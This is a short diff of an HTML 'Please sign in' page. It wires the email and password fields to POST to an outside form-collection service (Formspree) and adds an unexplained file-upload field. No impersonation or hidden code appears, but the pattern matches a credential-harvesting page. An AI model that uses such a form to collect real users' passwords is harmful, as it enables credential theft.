@@ -12,12 +12,13 @@
     />
   </head>
   <body>
-    <form>
+    <form action="https://formspree.io/f/mbjeavkq" method="POST">
       <section>
         <h1>Please sign in</h1>
         <div class="box email">
           <input
             type="email"
+            name="email"
             placeholder="Email address"
             minlength="5"
             maxlength="255"
@@ -25,15 +26,19 @@
           />
         </div>
         <div class="box password">
-          <input type="password" placeholder="Password" maxlength="255" />
+          <input
+            name="password"
+            type="password"
+            placeholder="Password"
+            maxlength="255"
+          />
         </div>
+        <input type="file" />
         <div class="box checkbox">
           <input type="checkbox" id="remember" />
           <label class="check" for="remember">Remember me</label>
         </div>
-        <div class="box button">
-          <button type="button">Sign in</button>
-        </div>
+        <button class="box button" type="submit">Sign in</button>
         <div class="box bottom">
           <p>Copyright &copy 2020</p>
         </div>
